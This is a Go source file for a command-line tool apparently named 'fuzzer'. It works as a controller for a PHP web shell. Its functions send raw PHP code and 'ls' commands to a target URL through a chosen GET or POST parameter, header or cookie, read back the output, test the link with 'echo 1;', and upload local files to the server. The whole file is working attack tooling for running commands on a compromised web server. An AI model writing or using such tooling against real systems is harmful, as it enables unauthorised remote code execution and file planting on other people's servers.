package app

import (
	"fmt"
	"fuzzer"
	"fuzzer/src/reader"
	"strings"

	"github.com/urfave/cli"
)

func (main *MainInterface) SendRawPHP(c *cli.Context) {
	cmd := strings.Join(c.Args(), " ")
	req, err := fuzzer.NET.Prepare(cmd)

	if err {
		return
	}

	resp, err := fuzzer.NET.Send(req)

	if err {
		return
	}

	result := fuzzer.NET.GetBodyStr(resp)
	reader.Read(result)
}

func (main *MainInterface) SendLs(c *cli.Context) {
	var ls string

	if c.Bool("raw") {
		r := "ls " + strings.Join(c.Args(), " ")
		ls = fuzzer.CMD.Raw(r)
	} else {
		context := c.Args().Get(0)
		ls = fuzzer.CMD.Ls(context)
	}

	req, err := fuzzer.NET.Prepare(ls)

	if err {
		return
	}

	resp, err := fuzzer.NET.Send(req)

	if err {
		return
	}

	result := fuzzer.NET.GetBodyStr(resp)
	reader.ReadEncode(result)
}

func (main *MainInterface) SendTest(c *cli.Context) {
	t := "echo 1;"
	req, err := fuzzer.NET.Prepare(t)

	if err {
		return
	}

	resp, err := fuzzer.NET.Send(req)

	if err {
		return
	}

	result := fuzzer.NET.GetBodyStr(resp)
	main.ReceiveTest(result)
}

func (main *MainInterface) ReceiveTest(str string) {
	if str == "1" {
		fmt.Println("Connected")
		return
	}

	fmt.Println("Error")
}

func (main *MainInterface) SendUpload(c *cli.Context) {
	arr := c.Args()

	if len(arr) < 1 {
		fmt.Println("Please write the path of the local file to upload")
		return
	}

	path := arr.First()
	pathArr := strings.Split(path, "/")
	lgt := len(pathArr) - 1
	dir := pathArr[lgt]

	if len(arr) > 1 {
		dir = arr.Get(1)
	}

	bytes, bondary, err := fuzzer.Upload(path, dir)

	if err {
		return
	}

	req, err := fuzzer.NET.PrepareUpload(bytes, bondary)

	if err {
		return
	}

	resp, err := fuzzer.NET.Send(req)

	if err {
		return
	}

	result := fuzzer.NET.GetBodyStr(resp)
	main.ReceiveDownload(result)
}

func (main *MainInterface) ReceiveDownload(result string) {
	if result == "1" {
		fmt.Println("File succeedly upload")
		return
	}

	fmt.Println("An error occured")
}

func (main *MainInterface) ServerSetup(c *cli.Context) {
	srv := &fuzzer.NET

	if c.Bool("i") {
		fmt.Println("url : " + srv.GetUrl())
		fmt.Println("method : " + srv.GetMethodStr())
		fmt.Println("parameter : " + srv.GetParameter())
		return
	}

	url := c.String("u")
	method := c.Int("m")
	parameter := c.String("p")
	crypt := false

	if url == "" && srv.GetUrl() == "" {
		fmt.Println("Flag -u (url) is required")
		return
	}

	if method > 4 {
		fmt.Println("Method is between 0 (default) and 4. [0 => GET, 1 => POST, 3 => HEADER, 4 => COOKIE]")
		return
	}

	if parameter == "" {
		parameter = srv.GetParameter()
	}

	srv.SetConfig(url, method, parameter, crypt)
}

func (main *MainInterface) ServerInfo(c *cli.Context) {
	if fuzzer.NET.GetResponse() == nil {
		fmt.Println("You havn't made any request. You must make a request before being able to see information")
		return
	}

	if len(c.Args()) < 1 {
		fmt.Println("Request => ")
		requestInfo(c)

		fmt.Println("Response => ")
		responseInfo(c)

		return
	}

	item := c.Args().Get(0)

	if item == "request" {
		requestInfo(c)
		return
	}

	if item == "response" {
		responseInfo(c)
		return
	}

	fmt.Println("The item : " + item + " is not specified. Please refer to srv info -h for more information")
}
